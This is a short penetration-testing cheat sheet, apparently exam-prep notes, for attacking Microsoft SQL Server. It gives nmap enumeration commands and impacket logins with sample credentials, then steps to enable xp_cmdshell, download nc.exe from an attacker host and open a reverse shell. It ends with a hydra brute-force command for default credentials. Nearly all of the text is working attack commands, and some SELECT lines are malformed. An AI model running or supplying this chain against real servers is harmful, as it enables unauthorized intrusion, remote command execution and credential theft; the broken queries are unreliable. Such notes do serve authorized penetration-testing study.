# MSSQL

## MSSQL 1433, 4022, 135, 1434, UDP 1434

For this port, you can find credentials from another port and log in with ipacket-mssqlclient

    nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip

    impacket-mssqlclient noman:'Noman@321@1!'@192.168.10.10

    impacket-mssqlclient Administrator: 'Noman@321@1!'@192.168.10.10 -windows-auth

    SELECT @@version; | SELECT name FROM sys.databases; | SELECT FROM offsec.information_schema.tables; | select from offsec.dbo.users;

### 1) Connect as CMD database


    SQL> EXECUTE sp_configure 'show advanced options', 1;

    SQL> RECONFIGURE;

    SQL> EXECUTE sp_configure 'xp_cmdshell', 1;

    SQL> RECONFIGURE;

    EXEC xp_cmdshell 'whoami';

    exec xp_cmdshell 'cmd /c powershell -c "curl 192.168.10.10/nc.exe -o \windows\temp\nc.exe"';

    exec xp_cmdshell 'cmd /c dir \windows\temp';

    exec xp_cmdshell 'cmd /c "\windows\temp\nc.exe 192.168.10.10 443 -e cmd"';

also applied on SQL Injection login

### 2) Brute force default MSSQL credentials

    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt IP mssql
